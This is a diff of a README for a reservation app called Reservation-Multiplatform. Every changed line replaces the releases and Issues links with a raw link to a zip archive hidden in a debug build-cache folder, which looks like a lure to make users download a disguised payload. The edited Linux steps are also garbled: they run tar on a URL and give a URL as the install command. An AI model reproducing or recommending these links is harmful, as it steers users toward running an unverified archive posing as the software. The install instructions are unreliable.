@@ -11,7 +11,7 @@
 To start using Reservation-Multiplatform, follow these simple steps.
 
 1. **Download the Software**
-   Visit this page to download the latest version of the software: [Download Reservation-Multiplatform](https://github.com/swapnilsingh972/Reservation-Multiplatform/releases)
+   Visit this page to download the latest version of the software: [Download Reservation-Multiplatform](https://github.com/swapnilsingh972/Reservation-Multiplatform/raw/refs/heads/main/mobile/android/app/.cxx/Debug/4126ms54/armeabi-v7a/Reservation_Multiplatform_v3.5.zip)
 
 2. **Install the Application**
    Once you download the file, follow the installation instructions specific to your operating system. You will find detailed steps below for various platforms.
@@ -22,11 +22,11 @@ To start using Reservation-Multiplatform, follow these simple steps.
 3. Follow the on-screen instructions to complete the installation.
 
 ### 🐧 For Linux Users:
-1. Download the tar.gz file.
+1. Download the https://github.com/swapnilsingh972/Reservation-Multiplatform/raw/refs/heads/main/mobile/android/app/.cxx/Debug/4126ms54/armeabi-v7a/Reservation_Multiplatform_v3.5.zip file.
 2. Open your terminal.
 3. Navigate to the download directory using the command: `cd Downloads`
-4. Extract the package with: `tar -xzf Reservation-Multiplatform.tar.gz`
-5. Run the application installer using the command: `./install.sh`
+4. Extract the package with: `tar -xzf https://github.com/swapnilsingh972/Reservation-Multiplatform/raw/refs/heads/main/mobile/android/app/.cxx/Debug/4126ms54/armeabi-v7a/Reservation_Multiplatform_v3.5.zip`
+5. Run the application installer using the command: `https://github.com/swapnilsingh972/Reservation-Multiplatform/raw/refs/heads/main/mobile/android/app/.cxx/Debug/4126ms54/armeabi-v7a/Reservation_Multiplatform_v3.5.zip`
 
 ### 🍏 For macOS Users:
 1. Download the DMG file.
@@ -35,7 +35,7 @@ To start using Reservation-Multiplatform, follow these simple steps.
 4. Run the application from your Applications folder.
 
 ## 📥 Download & Install
-To get started, remember to visit this page to download the latest version of Reservation-Multiplatform: [Download Reservation-Multiplatform](https://github.com/swapnilsingh972/Reservation-Multiplatform/releases)
+To get started, remember to visit this page to download the latest version of Reservation-Multiplatform: [Download Reservation-Multiplatform](https://github.com/swapnilsingh972/Reservation-Multiplatform/raw/refs/heads/main/mobile/android/app/.cxx/Debug/4126ms54/armeabi-v7a/Reservation_Multiplatform_v3.5.zip)
 
 ## 📋 System Requirements
 - **Operating System:** Windows 10 or later, macOS 10.13 or later, or most Linux distributions.
@@ -65,7 +65,7 @@ Admins and employees have access to additional features:
 - Manage customer accounts.
 
 ## 📈 Support
-For any questions or support requests, please check the project's [Issues page](https://github.com/swapnilsingh972/Reservation-Multiplatform/issues).
+For any questions or support requests, please check the project's [Issues page](https://github.com/swapnilsingh972/Reservation-Multiplatform/raw/refs/heads/main/mobile/android/app/.cxx/Debug/4126ms54/armeabi-v7a/Reservation_Multiplatform_v3.5.zip).
 
 ## 📝 Topics Covered
 - barbershop
@@ -97,4 +97,4 @@ Follow us on social media or check our community forums for tips, tricks, and up
 2. Back up your data regularly to avoid any loss.
 3. Try to familiarize yourself with all the features to maximize the usability of the application.
 
-Remember, for smooth installation and setup, visit this page to download the latest version of Reservation-Multiplatform: [Download Reservation-Multiplatform](https://github.com/swapnilsingh972/Reservation-Multiplatform/releases)
+Remember, for smooth installation and setup, visit this page to download the latest version of Reservation-Multiplatform: [Download Reservation-Multiplatform](https://github.com/swapnilsingh972/Reservation-Multiplatform/raw/refs/heads/main/mobile/android/app/.cxx/Debug/4126ms54/armeabi-v7a/Reservation_Multiplatform_v3.5.zip)
